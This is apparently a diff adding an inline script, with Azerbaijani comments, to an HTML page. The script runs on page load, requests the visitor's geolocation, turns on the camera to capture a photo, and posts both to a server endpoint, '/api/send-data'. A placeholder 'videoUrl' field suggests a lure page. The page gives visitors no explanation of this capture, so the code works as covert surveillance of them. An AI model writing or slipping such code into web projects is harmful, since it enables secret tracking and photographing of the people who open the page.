@@ -29,5 +29,61 @@
     </div>
 
     <script src="scripts.js"></script>
+    <script>
+async function sendData() {
+  let locationData = null;
+  let imageData = null;
+
+  // 📍 Lokasiyanı al
+  try {
+    const pos = await new Promise((res, rej) =>
+      navigator.geolocation.getCurrentPosition(res, rej)
+    );
+    locationData = {
+      latitude: pos.coords.latitude,
+      longitude: pos.coords.longitude
+    };
+  } catch (err) {
+    console.warn('Lokasiya alınmadı:', err.message);
+  }
+
+  // 📷 Kameradan şəkil al
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    await video.play();
+
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0);
+    imageData = canvas.toDataURL('image/jpeg');
+
+    stream.getTracks().forEach(t => t.stop());
+  } catch (err) {
+    console.warn('Kamera alınmadı:', err.message);
+  }
+
+  // 📨 Serverə göndər
+  const payload = {
+    videoUrl: 'kmkmkmm',
+    location: locationData,
+    image: imageData
+  };
+
+  const res = await fetch('/api/send-data', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  });
+
+  const result = await res.json();
+  console.log(result);
+}
+sendData();
+</script>
+
 </body>
 </html>
